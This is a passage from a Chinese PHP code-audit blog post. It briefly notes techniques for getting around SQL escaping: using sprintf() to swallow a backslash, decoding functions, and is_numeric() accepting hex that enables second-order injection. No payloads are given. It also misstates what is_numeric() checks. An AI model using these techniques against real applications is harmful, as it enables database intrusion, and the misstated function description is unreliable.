<a href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311124114.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311124114.png" alt="img" srcset="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311124114.png?size=small, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311124114.png?size=medium 1.5x, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311124114.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>可以利用<code>sprintf()</code>的特性吃掉<code>\</code>
<a href="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311134722.png"target="_blank" rel="external nofollow noopener noreferrer"><img loading="lazy" src="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311134722.png" alt="img" srcset="https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311134722.png?size=small, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311134722.png?size=medium 1.5x, https://springbird3.oss-cn-chengdu.aliyuncs.com/lianxiang/20220311134722.png?size=large 2x" data-title="img" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<ul>
<li>urldecode() 解码已编码的URL字符串</li>
<li>rawurldecode() 对已编码的URL字符串进行解码</li>
<li>is_numeric() 判断传入参数是否为字符串</li>
</ul>
<p><code>is_numeric()</code>函数存在插入十六进制字符串到数据库，进而导致SQL二次注入的风险</p>
<h6 id="参考链接" class="heading-element"><span>0.0.0.1.11  参考链接</span>
  <a href="#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h6><ul>
<li><a href="https://www.freebuf.com/articles/web/269184.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.freebuf.com/articles/web/269184.html</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/7834367.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/xiaozi/p/7834367.html</a></li>
<li><a href="https://www.cnblogs.com/xiaozi/p/7831529.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.cnblogs.com/xiaozi/p/7831529.html</a></li>
<li><a href="https://www.freebuf.com/articles/web/182280.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.freebuf.com/articles/web/182280.html</a></li>
<li><a href="https://segmentfault.com/a/1190000007250604"target="_blank" rel="external nofollow noopener noreferrer">https://segmentfault.com/a/1190000007250604</a></li>
<li><a href="https://xz.aliyun.com/t/7405"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/7405</a></li>
<li><a href="https://www.erikten.cn/posts/dcd7a0ad.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.erikten.cn/posts/dcd7a0ad.html</a></li>
<li><a href="https://xz.aliyun.com/t/5877"target="_blank" rel="external nofollow noopener noreferrer">https://xz.aliyun.com/t/5877</a></li>
<li><a href="https://blog.csdn.net/qq1124794084/article/details/104802553"target="_blank" rel="external nofollow noopener noreferrer">https://blog.csdn.net/qq1124794084/article/details/104802553</a></li>
<li><a href="https://www.freebuf.com/column/231352.html"target="_blank" rel="external nofollow noopener noreferrer">https://www.freebuf.com/column/231352.html</a></li>
</ul></div><div class="post-footer" id="post-footer">
  <div class="post-info">
    <div class="post-info-line">
      <div class="post-info-mod">
        <span title="Updated on 2024-08-15 09:31:01">Updated on 2024-08-15&nbsp;</span>
      </div></div><div class="post-info-line">
        <div class="post-info-md"></div>
        <div class="post-info-share">
          <span></span>
        </div>
      </div></div>

  <div class="post-info-more">
    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-tag" title="Tags - 代码审计">代码审计</a><a href="/tags/php%E5%AE%89%E5%85%A8/" class="post-tag" title="Tags - Php安全">Php安全</a></section>
    <section>
      <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
    </section>
  </div>

  <div class="post-nav"><a href="/posts/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/php/php%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/27/" class="post-nav-item" rel="prev" title="Php 原生类利用"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Php 原生类利用</a>
      <a href="/posts/%E6%94%BB%E9%98%B2/%E6%82%84%E6%82%84%E8%BF%9B%E6%9D%91/%E5%85%8D%E6%9D%80/67/" class="post-nav-item" rel="next" title="Php Webshell免杀">Php Webshell免杀<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article>

  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
    <div class="footer-container"><div class="footer-line powered">Powered by <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.132.1">Hugo</a> | Theme - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.9">FixIt</a>
        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
              <a href="/">东隅</a></span></div></div>
  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="Back to Top"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
        </div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;"></div><noscript>
    <div class="noscript-warning">This website works best with JavaScript enabled.</div>
  </noscript>
</div><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/instant-page/instantpage.min.js" async defer type="module"></script><script src="/lib/typeit/index.umd.js" defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"code":{"copyTitle":"Copy to clipboard","editLockTitle":"Lock editable code block","editUnLockTitle":"Unlock editable code block","editable":true,"maxShownLines":20},"comment":{"enable":false},"typeit":{"cursorChar":"_","cursorSpeed":1000,"duration":-1,"loop":false,"speed":100},"version":"v0.3.9"};</script><script src="/js/theme.min.js" defer></script><script>
      window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
      gtag('config', 'G-YMSM8DYT3D', { 'anonymize_ip': true });
    </script><script src="https://www.googletagmanager.com/gtag/js?id=G-YMSM8DYT3D" async></script></body>
</html>
